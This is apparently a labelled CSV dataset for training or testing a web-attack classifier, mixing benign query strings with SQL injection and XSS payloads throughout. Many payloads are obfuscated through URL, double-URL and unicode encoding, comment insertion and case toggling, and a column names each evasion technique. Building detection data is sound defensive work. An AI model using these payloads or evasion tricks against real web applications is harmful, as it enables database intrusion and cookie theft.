payload,label,techniques
--%25253E%25253Cimg%252520src%25253Dx%252520onerror%25253Dconfirm%252528document.domain%252529%25253E,xss,url_encode+double_url_encode
"<IFRAME%20SRC%3D#%20onmouseover%3D""alert(document.cookie)""%3E</IFRAME>",xss,partial_url_encode+case_toggle+comment_insertion
ref=budi&search=settings,benign,
RLIKE \u0028SELECT %28CASE WHEN \u00284346=4346%29 THEN 0x61646d696e ELSE 0x28 END\u0029%29 And &#39;Txws\u0027=\u0027,sqli,unicode_substitution+case_toggle
user_id=1295,benign,
currency=usd&redirect=/home,benign,
WHE/**/RE%250a1%3D1%2F%2A%2A%2FAND%250a1%3D0,sqli,whitespace+url_encode+comment_insertion
"1%27%20GROUP BY 1,2,--%2B",sqli,partial_url_encode
theme=dark&sort=desc,benign,
format=json&user_id=2914&size=m,benign,
AND%200,sqli,unicode_substitution+url_encode
color=budi,benign,
ORDER%2F%2A%2A%252FBY%0A27,sqli,whitespace+url_encode+partial_url_encode
ORDER%20BY%2023,sqli,case_toggle+unicode_substitution+url_encode
city=delta&format=json&coupon=orders,benign,
id=5322&qty=7539,benign,
benchmark%2850000000%2CMD5%281%29%29,sqli,case_toggle+fallback_full_url_encode
sort=asc&qty=437,benign,
offset=2436&token=4965162,benign,
%3Cscript>alert(document.domain%29%3C/script%3E,xss,partial_url_encode+whitespace+case_toggle
OR%20x%3Dx%23,sqli,url_encode
theme=dark&sort=asc&price_max=673,benign,
%27,sqli,comment_insertion+fallback_full_url_encode
ORDER%20BY%2010,sqli,comment_insertion+url_encode
theme=dark,benign,
session=520f8e5,benign,
token=1b29664&redirect=/home,benign,
callback=invoice,benign,
"""\u003E<iframe	src=\u0027https://testforiframe.site/&#39;>",xss,whitespace+comment_insertion+unicode_substitution
"RLIKE	\u0028SELeCT/**/(CASE%0aWHEN	\u00284346=4347%29%0aTHEN%090x61646d696e	ELSE
0x28%09END%29\u0029	ANd
%27Txws\u0027=%27",sqli,case_toggle+whitespace+unicode_substitution
%253CIMG%2520SRC%253D%2522javascript%253Aalert%2528%2527XSS%2527%2529%253B%2522%253E,xss,double_url_encode+comment_insertion+unicode_substitution
color=book&tab=foxtrot,benign,
OR%201%3D0--,sqli,url_encode+comment_insertion
search=phone,benign,
callback=citra,benign,
or%2520benchmark%252850000000%252CMD5%25281%2529%2529%2523,sqli,double_url_encode
price_min=4273&name=budget&lang=en,benign,
AS INJECTX WH/*!50000*/ERE 1=1 And 1=0--,sqli,comment_insertion+case_toggle
OR benchmark%2850000000%2CMD5%281))--,sqli,case_toggle+partial_url_encode
category=citra&offset=2030&lang=id,benign,
sort=desc&name=shoes,benign,
search=settings&lang=en&format=json,benign,
%3Cmarquee%20onstart=alert%281%29%3E%3C%2Fmarquee%3E,xss,partial_url_encode+whitespace+unicode_substitution
\u0022&gt;%3Cscript\u003Ealert(document.domain%29&#60;/script&gt;,xss,unicode_substitution
name=budget&id=7730&page=2459,benign,
city=shoes&q=shoes&session=5ee77af,benign,
size=m&qty=9325,benign,
q=jakarta&lang=en&coupon=citra,benign,
%3CScript%3Ealert%281%29%3C%2FScript%3E,xss,comment_insertion+fallback_full_url_encode
redirect=/home&user_id=2880,benign,
lang=en&id=7103&theme=dark,benign,
HAVING%201%3D0%23,sqli,unicode_substitution+case_toggle+fallback_full_url_encode
price_max=7917,benign,
--%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,xss,comment_insertion+whitespace+double_url_encode
currency=usd&page=8543,benign,
1%2520or%2520benchmark%252810000000%252CMD5%25281%252529%2529%2523,sqli,unicode_substitution+double_url_encode
%253Cbody%2520onmouseover%253D%2522print%2528%2529%2522%253E,xss,case_toggle+double_url_encode+whitespace
theme=dark&callback=delta,benign,
color=camera&offset=3049,benign,
color=foxtrot&email=jakarta@example.com,benign,
sort=asc&qty=8317,benign,
AND \u0028SELECT * FROM \u0028SELECT%28SLEEP(5)%29)nQIP)--,sqli,comment_insertion+unicode_substitution
ORDER BY%201,sqli,partial_url_encode
waitfor%0adelay	\u002700:00:05%27--,sqli,whitespace+unicode_substitution
ORDER%25252520BY%25252016,sqli,double_url_encode+partial_url_encode+url_encode
session=4efdb02,benign,
IF%25287423%253D7424%2529%2520SELECT%25207423%2520ELSE%2520DROP%2520FUNCTION%2520xcjl--,sqli,double_url_encode+comment_insertion+unicode_substitution
%2526lt%253Bimg%252509src%253D0%250Aonerror%253Dalert%2528document.cookie%2529%2526gt%253B,xss,whitespace+comment_insertion+double_url_encode
%27%29%29%20or%20pg_sleep%285%29--,sqli,comment_insertion+fallback_full_url_encode
AND%25207300%253D7300%2520AND%2520%2528%2527pKlZ%2527%253D%2527pKlY,sqli,double_url_encode
name=profile&token=15e9771,benign,
%2527%2520or%2520pg_sleep%25285%2529--,sqli,double_url_encode
view=grid&q=book&redirect=/home,benign,
tab=jakarta&view=grid&callback=orders,benign,
offset=1331,benign,
token=1003a3f&limit=4755,benign,
ORDER%2520BY%252030,sqli,double_url_encode+whitespace
%2527%25253BWAITFOR%252520DELAY%252520%2525270%25253A0%253A30%252527--,sqli,double_url_encode+partial_url_encode+whitespace
%3Cbody%20style%3D%22background-color%3Ared%20%21important%3B%22%3E,xss,comment_insertion+case_toggle+fallback_full_url_encode
ORDER%20BY%2014,sqli,case_toggle+fallback_full_url_encode
ORDER%20BY%2018,sqli,url_encode+partial_url_encode+whitespace
search=foxtrot,benign,
qty=2003&city=shoes&lang=en,benign,
'%20UNION SELECT%20sum(columnname ) from tablename%20--,sqli,partial_url_encode
%3Cimg%20src%3D%22%22%20onerror%3D%22alert%28document.cookie%29%22%3E,xss,case_toggle+fallback_full_url_encode
%25253CIFRAME%2520SRC%253D%252522javascript%25253Aalert%252528%2527XSS%252527%252529%25253B%2522%25253E%25253C%25252FIFRAME%25253E,xss,double_url_encode+case_toggle+partial_url_encode
token=5b74eb1,benign,
format=json&session=583cdc0&search=profile,benign,
--%20or%20%23,sqli,comment_insertion+fallback_full_url_encode
offset=5890&view=grid,benign,
%2522%2520OR%25201%2520%253D%25201%2520--%2520-,sqli,double_url_encode
theme=dark&coupon=book&email=citra@example.com,benign,
search=jakarta&currency=usd,benign,
price_max=7106,benign,
city=book&price_max=1295&q=delta,benign,
ORDER%20BY 29,sqli,comment_insertion+partial_url_encode
id=1355&format=json&search=shoes,benign,
%2529%29%253Bwaitfor%20delay%20%270%253A0%253A5%2527--,sqli,url_encode+partial_url_encode+unicode_substitution
%25%27%20AND%208310%3D8311%20AND%20%27%25%27%3D%27,sqli,url_encode+comment_insertion
currency=usd&name=orders,benign,
prompt%2528document.domain%2529,xss,double_url_encode+case_toggle
price_max=1626,benign,
ORDER BY%2015,sqli,unicode_substitution+partial_url_encode
city=settings&color=citra,benign,
price_min=1642&redirect=/home&qty=5634,benign,
lang=id&tab=shoes&city=dashboard,benign,
